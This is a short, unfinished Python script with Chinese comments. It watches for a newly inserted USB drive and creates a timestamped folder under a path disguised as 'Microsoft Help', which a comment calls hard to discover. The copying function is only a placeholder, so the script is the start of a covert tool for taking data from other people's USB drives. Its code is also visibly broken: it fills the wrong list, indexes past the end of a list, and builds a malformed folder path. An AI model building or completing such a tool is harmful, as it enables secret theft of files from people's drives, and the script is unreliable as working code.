import sys
import os
import shutil
import psutil
import time
import datetime

"""
sys是负责程序与python解释器的交互的。
shutil是对文件和文件集合的高阶操作库。
psutil是系统监控、分析、以及对系统进程进行一定管理的Python库。
time和datetime是时间操作库。
"""

# 启动时,获取本地已有的磁盘的信息
initial_disk = []
value = psutil.disk_partitions()
for i in value:
    initial_disk.append(i.device)


# 获取当前系统时间，在后面做为文件夹名字
def get_time():
    theTime = datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
    return theTime


# 获取U盘的相关信息
def get_udisk_infomation():
    while 1 == 1:
        current_disk = []
        tmp = psutil.disk_partitions()
        for j in tmp:
            initial_disk.append(j.device)

        # 如果检测到有新的磁盘
        if len(initial_disk) != len(current_disk):
            break
        else:
            # 暂停3秒后继续运行
            time.sleep(3)
            continue
    # 获取到的U盘根路径
    udisk_path = current_disk[len(current_disk)]
    # 生成文件夹的路径(windows系统路径，不易被发现)
    os.makedirs("C:\\Program Files\\Microsoft Help" + get_time())
    return udisk_path


def copy_data_function():
    print("haha")  # 未完成代码


if __name__ == "__main__":
    # 脚本启动后即开始运行“扫描U盘函数”
    get_udisk_infomation()
    copy_data_function()
